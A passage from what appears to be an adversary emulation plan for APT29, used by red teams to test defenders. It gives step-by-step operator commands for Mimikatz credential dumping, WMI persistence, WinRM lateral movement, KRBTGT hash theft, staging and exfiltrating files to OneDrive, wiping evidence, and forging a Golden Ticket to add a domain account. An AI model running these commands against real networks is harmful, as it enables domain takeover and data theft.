<li>You will now receive a new, high integrity callback</li>
</ol>
<doc-anchor-target id="14b---os-credential-dumping-lsass-memory-t1003--t1003001">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#14b---os-credential-dumping-lsass-memory-t1003--t1003001">#</doc-anchor-trigger>
        <span>14.B - OS Credential Dumping: LSASS Memory (<a href="https://attack.mitre.org/versions/v6/techniques/T1003/">T1003</a> / <a href="https://attack.mitre.org/techniques/T1003/001/">T1003.001</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Go to  where m.exe is on C2 server in another terminal</li>
<li>Confirm <code v-pre>m.exe</code> is there and is a Windows PE (<code v-pre>$ file m</code>)
<ul>
<li><code v-pre>m.exe</code> is a copy of the Mimikatz executable (available at <a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a>)</li>
</ul>
</li>
<li>Host file on port 8080 (<code v-pre>$ sudo python -m SimpleHTTPServer 8080</code>)</li>
<li>Interact with new callback</li>
<li>Load <code v-pre>stepFourteen_credDump.ps1</code></li>
<li>Execute <code v-pre>wmidump</code></li>
<li>Kill the python server (CTRL-C) once you see a GET request on the python server (VM terminal)</li>
</ol>
<doc-anchor-target id="cited-intelligence-3">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence-3">#</doc-anchor-trigger>
        <span>Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Open Invitation Contributors: Microsoft, SentinelOne</p>
</li>
<li><p>APT29 has embedded and encoded PowerShell scripts in WMI class properties.<sup><a href="https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016">5</a>,<a href="https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html">10</a> </sup></p>
</li>
<li><p>APT29 has bypassed UAC to elevate privileges.<sup><a href="https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016">5</a> </sup></p>
</li>
<li><p>APT29 has used WMI to store and run Invoke-Mimikatz (ATT&amp;CK S0002) on remote hosts.<sup><a href="https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html">7</a>,<a href="https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/">12</a> </sup></p>
</li>
<li><p>POSHSPY has used WMI to both store and persist PowerShell backdoor code. POSHSPY can also download and execute additional PowerShell code and Windows binaries.<sup> <a href="https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html">7</a>,<a href="https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html">10</a>,<a href="https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/">12</a> </sup></p>
</li>
</ul>
<hr>
<doc-anchor-target id="step-15---establish-persistence">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-15---establish-persistence">#</doc-anchor-trigger>
        <span>Step 15 - Establish Persistence</span>
    </h2>
</doc-anchor-target>
<p>The attacker establishes a secondary means of persistent access to the victim by creating a WMI event subscription (<a href="https://attack.mitre.org/versions/v6/techniques/T1084/">T1084</a> / <a href="https://attack.mitre.org/techniques/T1546/003/">T1546.003</a>) to execute a PowerShell payload whenever the current user (<a href="https://attack.mitre.org/techniques/T1033/">T1033</a>) logs in.</p>
<doc-anchor-target id="procedures-4">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-4">#</doc-anchor-trigger>
        <span>Procedures</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="15a---event-triggered-execution-windows-management-instrumentation-event-subscription-t1084--t1546003">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#15a---event-triggered-execution-windows-management-instrumentation-event-subscription-t1084--t1546003">#</doc-anchor-trigger>
        <span>15.A - Event Triggered Execution: Windows Management Instrumentation Event Subscription (<a href="https://attack.mitre.org/versions/v6/techniques/T1084/">T1084</a> / <a href="https://attack.mitre.org/techniques/T1546/003/">T1546.003</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Load <code v-pre>stepFifteen_wmi.ps1</code></li>
<li>Execute <code v-pre>wmi</code></li>
</ol>
<p><strong>Note:</strong> Do not RDP into the initial access from this point forward, you will trigger callbacks intended for step 20</p>
<doc-anchor-target id="cited-intelligence-4">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence-4">#</doc-anchor-trigger>
        <span>Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Open Invitation Contributors: Microsoft, SentinelOne</p>
</li>
<li><p>APT29 has used several persistence mechanisms, including WMI backdoors that execute PowerShell components.<sup> <a href="https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016">5</a>,<a href="https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html">10</a> </sup></p>
</li>
</ul>
<hr>
<doc-anchor-target id="step-16---lateral-movement">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-16---lateral-movement">#</doc-anchor-trigger>
        <span>Step 16 - Lateral Movement</span>
    </h2>
</doc-anchor-target>
<p>The attacker enumerates the environment’s domain controller (<a href="https://attack.mitre.org/techniques/T1018/">T1018</a>) and the domain’s security identifier (SID) (<a href="https://attack.mitre.org/techniques/T1033/">T1033</a>) via the Windows API (<a href="https://attack.mitre.org/techniques/T1106/">T1106</a>). Next, the attacker uses the previously dumped credentials (<a href="https://attack.mitre.org/versions/v6/techniques/T1078/">T1078</a> / <a href="https://attack.mitre.org/techniques/T1078/002/">T1078.002</a>) to create a remote PowerShell session to the domain controller (<a href="https://attack.mitre.org/versions/v6/techniques/T1028/">T1028</a> / <a href="https://attack.mitre.org/techniques/T1021/006/">T1021.006</a>). Through this connection, the attacker copies the Mimikatz binary used in Step 14 to the domain controller (<a href="https://attack.mitre.org/versions/v6/techniques/T1105/">T1105</a> / <a href="https://attack.mitre.org/techniques/T1570/">T1570</a>) then dumps the hash of the KRBTGT account (<a href="https://attack.mitre.org/versions/v6/techniques/T1003/">T1003</a> / <a href="https://attack.mitre.org/techniques/T1003/001">T1003.001</a>).</p>
<doc-anchor-target id="procedures-5">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-5">#</doc-anchor-trigger>
        <span>Procedures</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="16a---remote-system-discovery-t1018">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#16a---remote-system-discovery-t1018">#</doc-anchor-trigger>
        <span>16.A - Remote System Discovery (<a href="https://attack.mitre.org/techniques/T1018/">T1018</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Interact with low integrity callback</li>
<li>Load <code v-pre>powerView.ps1</code> (available at <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a>)</li>
<li>Execute <code v-pre>get-netdomaincontroller</code></li>
</ol>
<doc-anchor-target id="16b---system-owneruser-discovery-t1033">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#16b---system-owneruser-discovery-t1033">#</doc-anchor-trigger>
        <span>16.B - System Owner/User Discovery (<a href="https://attack.mitre.org/techniques/T1033/">T1033</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Load <code v-pre>stepSixteen_SID.ps1</code></li>
<li>Execute <code v-pre>siduser</code></li>
<li>Save the value for the domain SID (ex: <code v-pre>S-1-5-21-2219224806-3979921203-557828661-1110</code>) and delete the RID (ex: <code v-pre>-1110</code>) of the end (ex: <code v-pre>S-1-5-21-2219224806-3979921203-557828661</code>)</li>
</ol>
<doc-anchor-target id="16c---remote-services-windows-remote-management-t1028--t1021006">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#16c---remote-services-windows-remote-management-t1028--t1021006">#</doc-anchor-trigger>
        <span>16.C - Remote Services: Windows Remote Management (<a href="https://attack.mitre.org/versions/v6/techniques/T1028/">T1028</a> / <a href="https://attack.mitre.org/techniques/T1021/006/">T1021.006</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Interact with high integrity callback</li>
<li>Load <code v-pre>Invoke-WinRMSession.ps1</code> (available at <a href="https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-WinRMSession.ps1">https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-WinRMSession.ps1</a>)</li>
<li>Execute <code v-pre>invoke-winrmsession -Username &quot;[insert domain admin username]&quot; -Password &quot;[insert domain admin password]&quot; -IPAddress [insert domain controller IP]</code></li>
<li>Output will tell you a session opened and give you the format for using it, ex:
<code v-pre>Session opened, to run a command do the following:</code>
<code v-pre>Invoke-Command -Session $[session_id] -scriptblock {Get-Process} | out-string</code></li>
<li>Save the value for the session_id (ex: <code v-pre>$hzaqx</code>)</li>
</ol>
<p><strong>Note:</strong> If you get an error here, reboot domain controller, then re-run the 2 winrm setup commands before re-executing 16.C</p>
<doc-anchor-target id="16d---os-credential-dumping-t1003--t1003001">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#16d---os-credential-dumping-t1003--t1003001">#</doc-anchor-trigger>
        <span>16.D - OS Credential Dumping (<a href="https://attack.mitre.org/versions/v6/techniques/T1003/">T1003</a> / <a href="https://attack.mitre.org/techniques/T1003/001">T1003.001</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Execute <code v-pre>Copy-Item m.exe -Destination &quot;C:\Windows\System32\&quot; -ToSession $[session_id]</code>
<ul>
<li><code v-pre>m.exe</code> is a copy of the Mimikatz executable (available at <a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a>)</li>
</ul>
</li>
<li>Execute <code v-pre>Invoke-Command -Session $[session_id] -scriptblock {C:\Windows\System32\m.exe privilege::debug &quot;lsadump::lsa /inject /name:krbtgt&quot; exit} | out-string</code></li>
<li>Take note of value for the NTLM hash (ex: <code v-pre>NTLM : f4a688010d80770a55a22893dc6ac510</code>) near the top (Under RID and User after <code v-pre>* Primary</code>)</li>
<li>Execute <code v-pre>Get-PSSession | Remove-PSSession</code></li>
</ol>
<doc-anchor-target id="cited-intelligence-5">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence-5">#</doc-anchor-trigger>
        <span>Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Open Invitation Contributors: Microsoft, SentinelOne</p>
</li>
<li><p>PowerDuke can get the current user’s SID via select Windows API calls.<sup> <a href="https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/">11</a> </sup></p>
</li>
</ul>
<hr>
<doc-anchor-target id="step-17---collection">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-17---collection">#</doc-anchor-trigger>
        <span>Step 17 - Collection</span>
    </h2>
</doc-anchor-target>
<p>The attacker harvests emails stored in the local email client (<a href="https://attack.mitre.org/versions/v6/techniques/T1114/">T1114</a> / <a href="https://attack.mitre.org/techniques/T1114/001/">T1114.001</a>) before collecting (<a href="https://attack.mitre.org/techniques/T1005/">T1005</a>) and staging (<a href="https://attack.mitre.org/versions/v6/techniques/T1074/">T1074</a> / <a href="https://attack.mitre.org/techniques/T1074/001/">T1074.001</a>) a file of interest. The staged file is compressed (<a href="https://attack.mitre.org/versions/v6/techniques/T1002/">T1002</a> / <a href="https://attack.mitre.org/techniques/T1560/001">T1560.001</a>) as well as prepended with the magic bytes of the GIF file type (<a href="https://attack.mitre.org/techniques/T1027/">T1027</a>).</p>
<doc-anchor-target id="procedures-6">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-6">#</doc-anchor-trigger>
        <span>Procedures</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="17a---email-collection-local-email-collection-t1114--t1114001">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#17a---email-collection-local-email-collection-t1114--t1114001">#</doc-anchor-trigger>
        <span>17.A - Email Collection: Local Email Collection (<a href="https://attack.mitre.org/versions/v6/techniques/T1114/">T1114</a> / <a href="https://attack.mitre.org/techniques/T1114/001/">T1114.001</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Interact with low integrity callback</li>
<li>Load <code v-pre>stepSeventeen_email.ps1</code></li>
<li>Execute <code v-pre>psemail</code></li>
</ol>
<doc-anchor-target id="17b---data-from-local-system-t1005">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#17b---data-from-local-system-t1005">#</doc-anchor-trigger>
        <span>17.B - Data from Local System (<a href="https://attack.mitre.org/techniques/T1005/">T1005</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Interact with high integrity callback</li>
<li>Execute <code v-pre>New-Item -Path &quot;C:\Windows\Temp\&quot; -Name &quot;WindowsParentalControlMigration&quot; -ItemType &quot;directory&quot;</code></li>
<li>Execute <code v-pre>Copy-Item &quot;C:\Users\oscar\Documents\MITRE-ATTACK-EVALS.HTML&quot; -Destination &quot;C:\Windows\Temp\WindowsParentalControlMigration&quot;</code></li>
</ol>
<doc-anchor-target id="17c---obfuscated-files-or-information-t1027">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#17c---obfuscated-files-or-information-t1027">#</doc-anchor-trigger>
        <span>17.C - Obfuscated Files or Information (<a href="https://attack.mitre.org/techniques/T1027/">T1027</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Load <code v-pre>stepSeventeen_zip.ps1</code></li>
<li>Execute <code v-pre>zip C:\Windows\Temp\WindowsParentalControlMigration.tmp C:\Windows\Temp\WindowsParentalControlMigration</code></li>
</ol>
<doc-anchor-target id="cited-intelligence-6">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence-6">#</doc-anchor-trigger>
        <span>Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Open Invitation Contributors: Kaspersky, Microsoft</p>
</li>
<li><p>APT29 has used the legit Microsoft DLL and PowerShell to interact with Exchange Web Services (EWS) for email theft.<sup> <a href="https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html">7</a> </sup></p>
</li>
<li><p>POSHSPY can appended a file signature header to all encrypted data prior to upload or download.<sup> <a href="https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html">10</a> </sup></p>
</li>
</ul>
<hr>
<doc-anchor-target id="step-18---exfiltration">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-18---exfiltration">#</doc-anchor-trigger>
        <span>Step 18 - Exfiltration</span>
    </h2>
</doc-anchor-target>
<p>The attacker maps a local drive to an online web service account (<a href="https://attack.mitre.org/techniques/T1102/">T1102</a>) then exfiltrates the previous staged data to this repository (<a href="https://attack.mitre.org/versions/v6/techniques/T1048/">T1048</a> / <a href="https://attack.mitre.org/techniques/T567/002/">T1567.002</a>).</p>
<doc-anchor-target id="procedures-7">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-7">#</doc-anchor-trigger>
        <span>Procedures</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="18a---exfiltration-over-alternative-protocol-t1048--t1567002">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#18a---exfiltration-over-alternative-protocol-t1048--t1567002">#</doc-anchor-trigger>
        <span>18.A - Exfiltration Over Alternative Protocol (<a href="https://attack.mitre.org/versions/v6/techniques/T1048/">T1048</a> / <a href="https://attack.mitre.org/techniques/T567/002/">T1567.002</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Get CID for OneDrive account (<a href="https://www.laptopmag.com/articles/map-onedrive-network-drive">https://www.laptopmag.com/articles/map-onedrive-network-drive</a>)</li>
<li>Execute <code v-pre>net use y: https://d.docs.live.net/[CID] /user:[OneDrive account]@outlook.com &quot;[OneDrive password]&quot;</code></li>
<li>Execute <code v-pre>Copy-Item &quot;C:\Windows\Temp\WindowsParentalControlMigration.tmp&quot; -Destination &quot;Y:\WindowsParentalControlMigration.tmp&quot;</code></li>
<li>Login to <a href="https://onedrive.live.com/?id=root&amp;cid=%5BCID%5D">https://onedrive.live.com/?id=root&amp;cid=[CID]</a> to see exfil (<code v-pre>WindowsParentalControlMigration.tmp</code>)</li>
</ol>
<doc-anchor-target id="cited-intelligence-7">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence-7">#</doc-anchor-trigger>
        <span>Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Open Invitation Contributors: Kaspersky, Microsoft, SentinelOne</p>
</li>
<li><p>CloudDuke can use a Microsoft OneDrive to exchange stolen data with its operators.<sup> <a href="https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf">1</a>,<a href="https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016">5</a> </sup></p>
</li>
</ul>
<hr>
<doc-anchor-target id="step-19---clean-up">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-19---clean-up">#</doc-anchor-trigger>
        <span>Step 19 - Clean Up</span>
    </h2>
</doc-anchor-target>
<p>The attacker deletes various files (<a href="https://attack.mitre.org/versions/v6/techniques/T1107/">T1107</a> / <a href="https://attack.mitre.org/techniques/T1070/004/">T1070.004</a>) associated with that access by reflectively loading and executing the Sdelete binary (<a href="https://attack.mitre.org/versions/v6/techniques/T1055/">T1055</a> / <a href="https://attack.mitre.org/techniques/T1055/002/">T1055.002</a>) within powershell.exe.</p>
<doc-anchor-target id="procedures-8">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-8">#</doc-anchor-trigger>
        <span>Procedures</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="19a---indicator-removal-on-host-file-deletion-t1107--t1070004">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#19a---indicator-removal-on-host-file-deletion-t1107--t1070004">#</doc-anchor-trigger>
        <span>19.A - Indicator Removal on Host: File Deletion (<a href="https://attack.mitre.org/versions/v6/techniques/T1107/">T1107</a> / <a href="https://attack.mitre.org/techniques/T1070/004/">T1070.004</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Load <code v-pre>wipe.ps1</code></li>
<li>Execute <code v-pre>wipe &quot;C:\Windows\System32\m.exe&quot;</code></li>
</ol>
<p><strong>Note:</strong> There&#x27;s a known bug here with ETW (Invoke-ReflectivePEInjection patches a function on the fly that ETW invokes) so callback may die and hang.</p>
<doc-anchor-target id="19b---indicator-removal-on-host-file-deletion-t1107--t1070004">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#19b---indicator-removal-on-host-file-deletion-t1107--t1070004">#</doc-anchor-trigger>
        <span>19.B - Indicator Removal on Host: File Deletion (<a href="https://attack.mitre.org/versions/v6/techniques/T1107/">T1107</a> / <a href="https://attack.mitre.org/techniques/T1070/004/">T1070.004</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Execute <code v-pre>wipe &quot;C:\Windows\Temp\WindowsParentalControlMigration.tmp&quot;</code></li>
</ol>
<doc-anchor-target id="19c---indicator-removal-on-host-file-deletion-t1107--t1070004">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#19c---indicator-removal-on-host-file-deletion-t1107--t1070004">#</doc-anchor-trigger>
        <span>19.C - Indicator Removal on Host: File Deletion (<a href="https://attack.mitre.org/versions/v6/techniques/T1107/">T1107</a> / <a href="https://attack.mitre.org/techniques/T1070/004/">T1070.004</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Execute <code v-pre>wipe &quot;C:\Windows\Temp\WindowsParentalControlMigration\MITRE-ATTACK-EVALS.HTML&quot;</code></li>
</ol>
<doc-anchor-target id="cited-intelligence-8">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence-8">#</doc-anchor-trigger>
        <span>Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Open Invitation Contributors: Microsoft, SentinelOne</p>
</li>
<li><p>APT29 has removed tools and forensic artifacts to hide activity, including the usage of Sdelete (<a href="https://attack.mitre.org/software/S0195/">S0195</a>).<sup> <a href="https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016">5</a> </sup></p>
</li>
<li><p>PowerDuke can write random data across then delete a file.<sup> <a href="https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/">11</a> </sup></p>
</li>
</ul>
<doc-anchor-target id="step-20---leverage-persistence">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-20---leverage-persistence">#</doc-anchor-trigger>
        <span>Step 20 - Leverage Persistence</span>
    </h2>
</doc-anchor-target>
<p>The original victim is rebooted and the legitimate user logs in, emulating ordinary usage and a passage of time. This activity triggers the previously established persistence mechanisms, namely the execution of the DLL payload (<a href="https://attack.mitre.org/versions/v6/techniques/T1085/">T1085</a> / <a href="https://attack.mitre.org/techniques/T1218/011/">T1218.011</a>), referenced by the Windows Registry Run key, and the WMI event subscription (<a href="https://attack.mitre.org/versions/v6/techniques/T1084/">T1084</a> / <a href="https://attack.mitre.org/techniques/T1546/003/">T1546.003</a>), which executes a new PowerShell stager (<a href="https://attack.mitre.org/versions/v6/techniques/T1086/">T1086</a> / <a href="https://attack.mitre.org/techniques/T1059/001/">T1059.001</a>). The attacker uses the renewed access to generate a Kerberos Golden Ticket (<a href="https://attack.mitre.org/versions/v6/techniques/T1097/">T1097</a> / <a href="https://attack.mitre.org/techniques/T1558/001/">T1558.001</a>, <a href="https://attack.mitre.org/techniques/T1558/003/">T1558.003</a>), using materials from the earlier breach, which is used to establish a remote PowerShell session to a new victim (<a href="https://attack.mitre.org/versions/v6/techniques/T1021/">T1028</a> / <a href="https://attack.mitre.org/techniques/T1021/006/">T1021.006</a>). Through this connection, the attacker creates a new account within the domain (<a href="https://attack.mitre.org/versions/v6/techniques/T1136/">T1136</a> / <a href="https://attack.mitre.org/techniques/T1136/001/">T1136.001</a>).</p>
<doc-anchor-target id="procedures-9">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-9">#</doc-anchor-trigger>
        <span>Procedures</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="20a---persistence-execution-t1085--t1218011-t1084--t1546003">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#20a---persistence-execution-t1085--t1218011-t1084--t1546003">#</doc-anchor-trigger>
        <span>20.A - Persistence Execution (<a href="https://attack.mitre.org/versions/v6/techniques/T1085/">T1085</a> / <a href="https://attack.mitre.org/techniques/T1218/011/">T1218.011</a>, <a href="https://attack.mitre.org/versions/v6/techniques/T1084/">T1084</a> / <a href="https://attack.mitre.org/techniques/T1546/003/">T1546.003</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Execute <code v-pre>restart-computer -force</code></li>
<li>Existing 2 callbacks should die</li>
<li>RDP and login to initial victim once it reboots</li>
<li>Persistence mechanisms should fire on login (1 for DLL, 1 or more for WMI event subscription)</li>
</ol>
<p><strong>Note:</strong> You may need to repeat login process a few times (close and reopen RDP session) for WMI execute to fire</p>
<doc-anchor-target id="20b---use-alternate-authentication-material-pass-the-ticket-t1097--t1550001-t1550003">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#20b---use-alternate-authentication-material-pass-the-ticket-t1097--t1550001-t1550003">#</doc-anchor-trigger>
        <span>20.B - Use Alternate Authentication Material: Pass the Ticket (<a href="https://attack.mitre.org/versions/v6/techniques/T1097/">T1097</a> / <a href="https://attack.mitre.org/techniques/T1550/001/">T1550.001</a>, <a href="https://attack.mitre.org/techniques/T1550/003/">T1550.003</a>)</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Interact with the SYSTEM PS callback (from WMI)</li>
<li>Execute <code v-pre>klist purge</code></li>
<li>Load <code v-pre>Invoke-Mimikatz.ps1</code> (available at <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1</a>)</li>
<li>Execute <code v-pre>invoke-mimikatz -command '&quot;kerberos::golden /domain:dmevals.local /sid:[SID] /rc4:[NTLM HASH] /user:mscott /ptt&quot;'</code> using the SID and NTLM values from earlier</li>
<li>Execute <code v-pre>klist</code> and confirm ticket is in cache</li>
<li>Execute <code v-pre>Enter-PSSession [hostname of second workstation in domain]</code></li>
<li>Execute <code v-pre>Invoke-Command -ComputerName [hostname of second workstation in domain] -ScriptBlock {net user /add toby &quot;pamBeesly&lt;3&quot;}</code></li>
</ol>
<doc-anchor-target id="cited-intelligence-9">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence-9">#</doc-anchor-trigger>
        <span>Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Open Invitation Contributors: Microsoft, SentinelOne</p>
</li>
<li><p>APT29 have used Kerberos ticket attacks for lateral movement and has created accounts to log in.<sup> <a href="https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016">5</a>,<a href="https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html">7</a> </sup></p>
</li>
</ul>
<hr>
<doc-anchor-target id="acknowledgements">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#acknowledgements">#</doc-anchor-trigger>
        <span>Acknowledgements</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="special-thanks-to-the-following-public-resources">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#special-thanks-to-the-following-public-resources">#</doc-anchor-trigger>
        <span>Special thanks to the following public resources:</span>
    </h3>
</doc-anchor-target>
<ul>
<li>Atomic Red Team (<a href="https://github.com/redcanaryco/atomic-red-team">https://github.com/redcanaryco/atomic-red-team</a>)</li>
<li>Mimikatz (<a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a>)</li>
<li>Pinvoke (<a href="http://www.pinvoke.net">http://www.pinvoke.net</a>)</li>
<li>PoshC2 (<a href="https://github.com/nettitude/PoshC2">https://github.com/nettitude/PoshC2</a>)</li>
<li>POSHSPY (<a href="https://github.com/matthewdunwoody/POSHSPY">https://github.com/matthewdunwoody/POSHSPY</a>)</li>
<li>PowerSploit (<a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a>)</li>
<li>PSReflect-Functions (<a href="https://github.com/jaredcatkinson/PSReflect-Functions">https://github.com/jaredcatkinson/PSReflect-Functions</a>)</li>
<li>State of the Hack S2E01: #NoEasyBreach REVISITED (<a href="https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html">https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html</a>)</li>
<li>Use PowerShell to Interact with the Windows API (<a href="https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-1">https://devblogs.microsoft.com/scripting/use-powershell-to-interact-with-the-windows-api-part-1</a>)</li>
<li>Yet another sdclt UAC bypass (<a href="http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass">http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass</a>)</li>
</ul>
<hr>
<doc-anchor-target id="additional-plan-resources">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#additional-plan-resources">#</doc-anchor-trigger>
        <span>Additional Plan Resources</span>
    </h2>
</doc-anchor-target>
<ul>
<li><a href="/apt29/intelligence_summary.md">Intelligence Summary</a></li>
<li><a href="/apt29/operations_flow.md">Operations Flow</a></li>
<li><a href="/apt29/emulation_plan/readme.md">Emulation Plan</a>
<ul>
<li><a href="/apt29/emulation_plan/scenario_1/infrastructure.md">Scenario 1 - Infrastructure</a></li>
<li><a href="/apt29/emulation_plan/scenario_1/readme.md">Scenario 1</a></li>
<li><a href="/apt29/emulation_plan/scenario_2/infrastructure.md">Scenario 2 - Infrastructure</a></li>
<li><a href="/apt29/emulation_plan/scenario_2/readme.md">Scenario 2</a></li>
<li><a href="/apt29/emulation_plan/yaml">YAML</a></li>
</ul>
</li>
<li><a href="/apt29/archive">Archive</a></li>
<li><a href="https://github.com/center-for-threat-informed-defense/adversary_emulation_library/issues">Issues</a></li>
<li><a href="/apt29/change_log.md">Change Log</a></li>
</ul>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer class="clear-both">
                            
                                <nav class="flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/apt29/emulation_plan/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
                                                <span class="block mt-1">APT​29 Adversary Emulation</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
